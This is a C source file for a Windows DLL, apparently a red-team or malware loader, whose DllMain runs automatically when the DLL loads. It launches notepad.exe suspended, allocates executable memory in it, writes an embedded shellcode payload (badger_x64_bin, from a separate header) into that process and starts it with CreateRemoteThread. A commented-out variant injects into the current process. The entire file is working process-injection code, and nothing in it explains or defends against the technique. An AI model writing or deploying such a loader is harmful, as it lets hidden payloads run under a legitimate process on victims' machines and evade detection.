#include <windows.h>
#include <stdio.h>
#include "shellcode.h"

BOOL __stdcall DllMain(HMODULE, DWORD, LPVOID);

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH: {
        // LPVOID addressPointer = VirtualAlloc(NULL, badger_x64_bin_len, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        // if (addressPointer) {
        //     memcpy(addressPointer, badger_x64_bin, badger_x64_bin_len);
        //     ((void(*)()) addressPointer)();
        // }

        MessageBoxA(NULL, "Test", "Caption", MB_OK);
        STARTUPINFOA sinfo = { 0 };
        sinfo.cb = sizeof(STARTUPINFOA);
        PROCESS_INFORMATION pinfo = { 0 };
        if (CreateProcessA(NULL, "notepad.exe", NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, &sinfo, &pinfo)) {
            LPVOID addressPointer = VirtualAllocEx(pinfo.hProcess, NULL, badger_x64_bin_len, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            if (addressPointer) {
                if (WriteProcessMemory(pinfo.hProcess, addressPointer, badger_x64_bin, badger_x64_bin_len, 0)) {
                    CreateRemoteThread(pinfo.hProcess, 0, 1024 * 1024, addressPointer, 0, 0, 0);
                    WaitForSingleObject(pinfo.hThread, INFINITE);
                }
            }
        }
        //ExitProcess(0);
        return 0;
        break;
    }
    case DLL_THREAD_ATTACH:
        break;

    case DLL_THREAD_DETACH:
        break;

    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
